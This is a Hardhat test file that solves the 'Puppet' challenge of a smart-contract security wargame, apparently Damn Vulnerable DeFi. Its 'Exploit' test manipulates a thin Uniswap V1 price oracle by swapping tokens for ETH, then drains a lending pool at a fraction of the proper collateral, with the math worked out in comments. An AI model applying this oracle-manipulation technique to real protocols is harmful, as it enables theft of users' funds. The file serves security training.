import { time, loadFixture } from "@nomicfoundation/hardhat-network-helpers";
import { anyValue } from "@nomicfoundation/hardhat-chai-matchers/withArgs";
import { expect } from "chai";
import { ethers } from "hardhat";
import {SignerWithAddress} from "@nomiclabs/hardhat-ethers/signers";
import { BigNumber } from "ethers";

const exchangeJson = require("../../build-uniswap-v1/UniswapV1Exchange.json");
const factoryJson = require("../../build-uniswap-v1/UniswapV1Factory.json");

// Calculates how much ETH (in wei) Uniswap will pay for the given amount of tokens
function calculateTokenToEthInputPrice(tokensSold:BigNumber, tokensInReserve:BigNumber, etherInReserve:BigNumber) {
    return tokensSold.mul(ethers.BigNumber.from('997')).mul(etherInReserve).div(
        (tokensInReserve.mul(ethers.BigNumber.from('1000')).add(tokensSold.mul(ethers.BigNumber.from('997'))))
    )
}

describe("Puppet Test", function () {
    let deployer: SignerWithAddress;
    let attacker: SignerWithAddress;
    let someUser: SignerWithAddress;
    
    // Uniswap exchange will start with 10 DVT and 10 ETH in liquidity
    const UNISWAP_INITIAL_TOKEN_RESERVE = ethers.utils.parseEther('10');
    const UNISWAP_INITIAL_ETH_RESERVE = ethers.utils.parseEther('10');

    const ATTACKER_INITIAL_TOKEN_BALANCE = ethers.utils.parseEther('1000');
    const ATTACKER_INITIAL_ETH_BALANCE = ethers.utils.parseEther('25');
    const POOL_INITIAL_TOKEN_BALANCE = ethers.utils.parseEther('100000');
    
  async function setupFixture() {
    /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */

    [deployer, attacker, someUser] = await ethers.getSigners();
    
    const UniswapExchangeFactory = new ethers.ContractFactory(exchangeJson.abi, exchangeJson.evm.bytecode, deployer);
        const UniswapFactoryFactory = new ethers.ContractFactory(factoryJson.abi, factoryJson.evm.bytecode, deployer);

        const DamnValuableTokenFactory = await ethers.getContractFactory('DamnValuableToken', deployer);
        const PuppetPoolFactory = await ethers.getContractFactory('PuppetPool', deployer);

        await ethers.provider.send("hardhat_setBalance", [
            attacker.address,
            "0x15af1d78b58c40000", // 25 ETH
        ]);
        expect(
            await ethers.provider.getBalance(attacker.address)
        ).to.equal(ATTACKER_INITIAL_ETH_BALANCE);

        // Deploy token to be traded in Uniswap
        const token = await DamnValuableTokenFactory.deploy();

        // Deploy a exchange that will be used as the factory template
        const exchangeTemplate = await UniswapExchangeFactory.deploy();

        // Deploy factory, initializing it with the address of the template exchange
        const uniswapFactory = await UniswapFactoryFactory.deploy();
        await uniswapFactory.initializeFactory(exchangeTemplate.address);

        // Create a new exchange for the token, and retrieve the deployed exchange's address
        let tx = await uniswapFactory.createExchange(token.address, { gasLimit: 1e6 });
        const { events } = await tx.wait();
        const uniswapExchange = UniswapExchangeFactory.attach(events[0].args.exchange);

        // Deploy the lending pool
        const lendingPool = await PuppetPoolFactory.deploy(
            token.address,
            uniswapExchange.address
        );
    
        // Add initial token and ETH liquidity to the pool
        await token.approve(
            uniswapExchange.address,
            UNISWAP_INITIAL_TOKEN_RESERVE
        );
        await uniswapExchange.addLiquidity(
            0,                                                          // min_liquidity
            UNISWAP_INITIAL_TOKEN_RESERVE,
            (await ethers.provider.getBlock('latest')).timestamp * 2,   // deadline
            { value: UNISWAP_INITIAL_ETH_RESERVE, gasLimit: 1e6 }
        );
        
        // Ensure Uniswap exchange is working as expected
        expect(
            await uniswapExchange.getTokenToEthInputPrice(
                ethers.utils.parseEther('1'),
                { gasLimit: 1e6 }
            )
        ).to.be.eq(
            calculateTokenToEthInputPrice(
                ethers.utils.parseEther('1'),
                UNISWAP_INITIAL_TOKEN_RESERVE,
                UNISWAP_INITIAL_ETH_RESERVE
            )
        );
        
        // Setup initial token balances of pool and attacker account
        await token.transfer(attacker.address, ATTACKER_INITIAL_TOKEN_BALANCE);
        await token.transfer(lendingPool.address, POOL_INITIAL_TOKEN_BALANCE);
        return {lendingPool, token, uniswapExchange}
  }
    it("Deployment", async function () {
        const {lendingPool} = await loadFixture(setupFixture);
      
        // Ensure correct setup of pool. For example, to borrow 1 need to deposit 2
        expect(
            await lendingPool.calculateDepositRequired(ethers.utils.parseEther('1'))
        ).to.be.eq(ethers.utils.parseEther('2'));

        expect(
            await lendingPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE)
        ).to.be.eq(POOL_INITIAL_TOKEN_BALANCE.mul('2')); 
    });

    it("Exploit", async function () {
        const {lendingPool, token, uniswapExchange} = await loadFixture(setupFixture);
        // LendingPool - 100000 DVT
        // Uni market - 10 DVT and 10 ETH
        // Our balance - 1000 DVT and 25 ETH
        // Drain the lending Pool

        // collateralWei = (borrowAmountDVT ) * (k * 2) / 1e18  => 
        // borrowAmountDVT = (collateralWei * 1e18) / 2k

        // (x1 + x)*(y - y1) = x * y
        // x, y - reserves
        //  x- DVT
        //  y- ETH
        // Swapping 1000 DVT for ETH
        // y1 = (y*x1)/(x+x1)
        // y1(amount of ETH) = (10e18 * 1000e18)/(10e18+1000e18) = 10000*10**36/ 1010 * 10**18= 10000 * 10**18 / 1010 = (1000/101) * 10**18 ~ 9.9 * 10**18 
        
        // Now the pool has 1010 DVT and 0.1 ETH
        // so the oraclePrice =  uniswapPair.balance * (10 ** 18) / token.balanceOf(uniswapPair) = 0.1 * 10**18 * 10**18 / 1010 * 10**18 
        // = 0.1 * 10**36 / 1010 * 10**18 = 0.1 * 10**18 / 1010 = 10**16 / 101

        // Deposit in Wei required =  amountDVT * _computeOraclePrice() * 2 / 10 ** 18 
        // amountDVT = 100000 DVT => depositInWei = 100000 * 10**18  * (10**16 / 101) * 2 / 10**18 = 10**39 * 2 / 101 * 10**18 = 2 * 10**21 / 101 = 2000 * 10**18  / 101 ~ 19.8 * 10**18



        // Sandwich attack
        await token.connect(attacker).approve(uniswapExchange.address, ATTACKER_INITIAL_TOKEN_BALANCE);
        await uniswapExchange.connect(attacker).tokenToEthSwapOutput(ethers.utils.parseEther('9.9'),
            ATTACKER_INITIAL_TOKEN_BALANCE,
            (await ethers.provider.getBlock('latest')).timestamp * 2
        );

        const depositRequired = await lendingPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE);
        expect(depositRequired < ATTACKER_INITIAL_ETH_BALANCE).to.be.true;
        // borrow the max amount of token
        await lendingPool.connect(attacker).borrow(POOL_INITIAL_TOKEN_BALANCE, {value: depositRequired})

        expect(await token.balanceOf(lendingPool.address)).to.equal(ethers.constants.Zero);
    });
  });
